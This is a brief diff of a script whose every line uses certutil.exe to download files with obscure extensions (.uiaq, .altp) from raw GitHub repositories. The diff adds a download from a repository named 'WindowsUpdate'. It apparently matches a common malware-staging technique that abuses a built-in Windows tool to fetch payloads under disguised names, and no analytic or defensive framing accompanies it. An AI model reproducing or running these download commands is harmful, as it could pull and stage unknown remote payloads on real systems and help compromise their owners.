@@ -1,5 +1,4 @@
-certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/MiCert.uiaq" MiCert.uiaq
-certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/MiCertIII.uiaq" MiCertIII.uiaq
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/MiCertIII.uiaq" MiCertIII.uiaq 
 certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/6pylooper.uiaq" 6pylooper.uiaq
 certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/6pylooper.altp" 6pylooper.altp
 certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/8opfile.uiaq" 8opfile.uiaq
